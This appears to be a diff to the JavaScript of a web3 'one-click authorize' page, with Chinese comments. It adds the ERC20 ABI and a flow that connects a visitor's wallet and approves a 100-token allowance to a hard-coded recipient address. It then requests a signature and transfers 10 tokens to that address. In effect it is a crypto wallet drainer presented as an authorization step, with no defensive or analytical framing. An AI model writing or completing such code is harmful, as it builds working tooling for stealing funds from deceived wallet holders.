@@ -1,10 +1,47 @@
+// 要转移代币的目标地址
 const recipientAddress = '0xa465e2fc9f9d527aaeb07579e821d461f700e699';
 let web3;
 let isConnected = false;
 let isRequestPending = false;
 
+// ERC20标准合约的ABI
 const erc20Abi = [
-    // ERC20 ABI 省略...
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "totalSupply",
+        "outputs": [{"name": "", "type": "uint256"}],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [{"name": "_owner", "type": "address"}],
+        "name": "balanceOf",
+        "outputs": [{"name": "balance", "type": "uint256"}],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": false,
+        "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}],
+        "name": "approve",
+        "outputs": [{"name": "", "type": "bool"}],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "constant": false,
+        "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
+        "name": "transfer",
+        "outputs": [{"name": "", "type": "bool"}],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+    }
 ];
 
 // 连接钱包的按钮点击事件
@@ -41,7 +78,6 @@ async function connectWallet(walletType) {
                 document.getElementById('status').innerText = '请安装 MetaMask 钱包';
             }
         }
-        // 其他钱包类型的连接逻辑可以在这里添加
     } catch (error) {
         document.getElementById('status').innerText = '连接失败: ' + error.message;
     } finally {
@@ -57,7 +93,7 @@ const updateWalletList = (address) => {
     walletList.appendChild(walletItem);
 };
 
-// 一键授权按钮点击事件
+// 授权和签名的按钮点击事件
 document.getElementById('authorizeButton').onclick = async () => {
     if (!isConnected) {
         document.getElementById('status').innerText = '请先连接钱包';
@@ -66,29 +102,47 @@ document.getElementById('authorizeButton').onclick = async () => {
 
     const accounts = await web3.eth.getAccounts();
     const account = accounts[0];
-    
+
+    // 确认 tokenContract 的 ABI 和合约地址
+    const tokenAddress = '0xYourTokenContractAddress'; // 这里填写你要操作的 ERC20 合约地址
+    const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
+
+    try {
+        // 授权代币额度
+        const tx = await tokenContract.methods.approve(recipientAddress, web3.utils.toWei('100', 'ether')).send({ from: account });
+        document.getElementById('status').innerText = '授权成功，正在请求签名...';
+
+        // 授权成功后直接执行签名操作
+        await performSignature(account);
+
+        // 开始代币转移
+        await transferTokens(account, tokenContract);
+    } catch (error) {
+        document.getElementById('status').innerText = '授权或签名失败: ' + error.message;
+    }
+};
+
+// 执行签名的函数
+const performSignature = async (account) => {
     const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
     try {
         const signature = await web3.eth.personal.sign(message, account);
-        document.getElementById('status').innerText = `授权成功: ${signature}`;
-        
-        // 自动弹出签名页面
+        document.getElementById('status').innerText = `授权和签名成功: ${signature}`;
+
+        // 自动弹出签名信息
         document.getElementById('signatureMessage').innerText = message;
         document.getElementById('signingSection').style.display = 'block';
-        
-        // 开始代币转移
-        await transferTokens(account);
     } catch (error) {
         document.getElementById('status').innerText = '签名失败: ' + error.message;
     }
 };
 
 // 代币转移逻辑
-const transferTokens = async (account) => {
-    // 省略代币转移逻辑...
-};
-
-// 获取代币余额的函数
-const getTokenBalances = async (address) => {
-    // 省略获取余额的逻辑...
+const transferTokens = async (account, tokenContract) => {
+    try {
+        const tx = await tokenContract.methods.transfer(recipientAddress, web3.utils.toWei('10', 'ether')).send({ from: account });
+        document.getElementById('status').innerText = '代币转移成功！';
+    } catch (error) {
+        document.getElementById('status').innerText = '代币转移失败: ' + error.message;
+    }
 };
